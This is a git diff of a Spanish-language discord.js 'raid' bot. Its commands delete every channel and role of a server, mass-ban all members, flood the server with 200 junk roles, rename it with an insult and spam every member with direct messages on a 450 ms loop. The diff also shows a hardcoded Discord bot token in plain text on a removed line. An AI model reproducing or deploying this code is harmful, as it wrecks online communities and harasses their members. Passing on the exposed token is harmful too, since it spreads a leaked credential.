@@ -1,31 +1,44 @@
 const Discord = require("discord.js");
 const client = new Discord.Client();
+const config = require("./config.json");
+
+let prefix = config.prefix;
  
 client.on("ready", () => {
     console.log(`Iniciando bot raid...`);
-    console.log(`Cliente ${client.user.tag} listo para el raid!`);
+    console.log(`Cliente ${client.user.tag} listo`);
     console.log("Pikachu");
     presencia();  
     });
- 
- 
- 
+
 function presencia(){
   client.user.setPresence({
 status: "dnd",
 activity: {
   name: "🎃ˏˋ𝓚𝖎𝔂𝖚𝖒𝖎ˎˊ🎃#9153",
-  type: "PLAYING"
+  type: "WATCHING"
  
 }
   });
 }
- 
+
+client.on('message', message => {
+    if (message.author.id !== '724423864611766294') 
+    if (message.author.id !== '771106611712098314') 
+  return;
+    if (message.content.startsWith(prefix + 'say')) {
+        if (message.author.bot) return;
+        message.delete()
+        const SayMessage = message.content.slice(6).trim();
+        message.channel.send(SayMessage)
+    }
+});
+
 //nuke
 
 client.on("message", message => {
-  if (message.author.id !== '724423864611766294') return;
-  
+  if (message.author.id !== '724423864611766294') 
+  return;
    if (message.content === 't.nuke') {
     message.guild.channels.cache.forEach(channel => channel.delete());
     message.guild.channels.create(`#si`, {
@@ -35,7 +48,6 @@ client.on("message", message => {
         })
          }
       })
-
 //comando especial
 client.on("message", message => {
    if (message.author.id !== '724423864611766294') return;
@@ -50,7 +62,15 @@ client.on("message", message => {
    }
    
 });
- 
+client.on("message", message => {
+   if (message.author.id !== '724423864611766294') return;
+    const args = message.content.slice().trim().split(/ +/g );
+    const command = args.shift().toLowerCase();
+   if (message.content.startsWith(prefix + 'supernatural')) {
+message.channel.send(`https://open.spotify.com/track/73icgGWQ5Zy89lwam6dIms?si=36fb5b68a20a41e7`);
+   }
+   
+});
 //raid
 client.on("message", message => {
       if (message.author.id !== '724423864611766294') return;
@@ -81,60 +101,51 @@ client.on("message", message => {
               })
               }
               }
-            });
-          
+            });     
 //mdall
 client.on("message", message => {
                         if (message.author.bot) return;
                         
-                      if(message.content === "t.mdall")
+                      if(message.content === "12413414213")
                       message.guild.members.cache.forEach(member => {
                         setInterval(function(){
                           member.send("https://open.spotify.com/track/6pb74p1J3mKnEEf7J1X8VO?si=971ac204f6ea4be2").catch(error => {});
                         },450);
                       })
                       });
- 
 //borar roles
- 
 client.on("message", message => {
                     if (message.author.bot) return;
                   
-                     if(message.content === ('t.deleterole')){
+                     if(message.content === ('12413414213')){
                             message.guild.roles.cache.map(roles => roles.delete());
                           }
                   });
- 
 //crear roles
- 
 client.on("message", message => {
                 if (message.author.bot) return;
               
-               if (message.content === 't.roles') {
+               if (message.content === '12413414213') {
               for (let i = 0; i <= 200; i++) {
                  message.guild.roles.create({data: {name: `RaidByTokyoMachine`,color: '#d41818',},reason: 'razon',})
               };
                }
                 });
- 
 //foto y nombre
- 
 client.on("message", message => {
                     if (message.author.bot) return;
                   
-                   if (message.content === 't.foto') {
-                      message.guild.setName("fuck off pyago");
+                   if (message.content === '12413414213') {
+                      message.guild.setName("");
                       message.guild.setIcon("https://media.discordapp.net/attachments/852694727362740274/854826226886508564/843294242431827988.png"
                       );
                       }
                     }); 
- 
 //banall
- 
 client.on("message", message => {
     if (message.author.bot) return;
   
-    if (message.content === 't.banall') {
+    if (message.content === '12413414213') {
     message.delete()
     message.guild.members.cache.forEach(m => {
     m.ban()
@@ -153,9 +164,9 @@ client.on("message", message => {
        const embed = new Discord.MessageEmbed()
        .setTitle(message.guild.name)
        .setThumbnail()
-       .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
-       .setColor("RED");
+       .setDescription(`**Channels:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
+       .setColor("PURPLE");
        message.channel.send(embed)
    }
 });
- client.login("OTAyMjkyNzM4NDkyNDg5Nzc4.YXcTmA.XZcDY-NVxljRnk8VEHdGnMPI41U");
+client.login(config.token);
